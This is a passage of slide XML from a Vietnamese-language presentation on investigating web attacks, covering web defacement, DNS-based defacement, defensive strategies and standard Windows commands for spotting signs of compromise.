              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Web page defacement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>là</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việc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sửa</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đổi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trái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phép</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một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trang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>dẫn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đến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việc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thay</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đổi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giao</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diện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hiển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thị</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của</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nó</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> qua DNS: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kẻ</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tấn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công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có</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thể</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xâm</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nhập</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máy</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chủ</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tên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miền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có</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thẩm</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quyền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để</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chuyển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hướng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các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yêu</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cầu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>của</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một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trang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> web sang </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>trang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>đã</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bị</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thay</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đổi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giao</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diện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của</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kẻ</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tấn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công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từ</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đó</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gián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tiếp</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làm</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thay</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đổi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giao</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diện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trang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>mục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tiêu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Google Shape;159;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1643182" y="3778813"/>
            <a:ext cx="87534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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Chiến lược bảo mật ứng dụng Web: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Google Shape;160;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1643175" y="4253600"/>
            <a:ext cx="8423100" cy="1800493"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Phản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ứng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nhanh</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chóng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với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các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lỗ</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hổng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bằng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cách</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cài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đặt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bản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vá</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ngay</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khi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chúng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có</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sẵn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thực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hiện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kiểm</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thử</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xâm</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nhập</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (pen-test) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>ứng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dụng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để</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hiểu</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và</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phân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tích</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các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sai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sót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trước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khi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bị</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tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Sử</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dụng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các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công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cụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> IDS (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Hệ</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thống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phát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hiện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xâm</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nhập</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và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> IPS (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Hệ</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thống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ngăn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ngừa</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xâm</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nhập</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để</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kiểm</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tra</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các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lỗ</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hổng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bảo</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mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Nâng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cao</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nhận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thức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về</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bảo</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mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Đảm</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bảo</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tài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khoản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người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dùng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không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có</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mật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khẩu</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yếu</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hoặc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bị</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thiếu</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và</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đóng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các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cổng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không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sử</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dụng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="161" name="Google Shape;161;p18" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="877850" y="1714312"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="162" name="Google Shape;162;p18" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="877850" y="3742012"/>
            <a:ext cx="381000" cy="381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66"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="167" name="Google Shape;167;p19" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="504825" y="1499800"/>
            <a:ext cx="11030100" cy="5052575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Google Shape;168;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="1729150"/>
            <a:ext cx="90954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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Điều tra tấn công Web trên máy chủ Windows: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="Google Shape;169;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="2162025"/>
            <a:ext cx="9528000" cy="2301300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="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Sử dụng Event Viewer (eventvwr.msc) để kiểm tra các sự kiện đáng ngờ như dịch vụ log bị dừng hoặc Windows File Protection không hoạt động.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Tìm kiếm số lượng lớn các lần đăng nhập thất bại hoặc tài khoản bị khóa.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Kiểm tra các chia sẻ tệp (net view), các phiên người dùng đang mở (net session) và các phiên máy đã mở với hệ thống khác (net use).</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Sử dụng lệnh nbtstat -S để kiểm tra hoạt động NetBIOS và netstat -na để tìm các cổng TCP/UDP đang lắng nghe bất thường.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Kiểm tra các tác vụ không bình thường trên máy chủ (at), các tài khoản mới trong nhóm quản trị (lusrmgr.msc), các tiến trình không mong đợi trong Task Manager và các dịch vụ mạng lạ (net start).</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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 Kiểm tra việc sử dụng dung lượng tệp để tìm dấu hiệu dung lượng trống giảm đột ngột</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Google Shape;170;p19"/>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III. Trả lời câu hỏi Chapter 3 - Investigating Web Attacks</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="Google Shape;171;p19"/>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72" name="Google Shape;172;p19" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="1700212"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="173" name="Google Shape;173;p19" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="4566675"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Google Shape;174;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="4607450"/>
            <a:ext cx="83523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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Tầm quan trọng của công cụ WHOIS:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
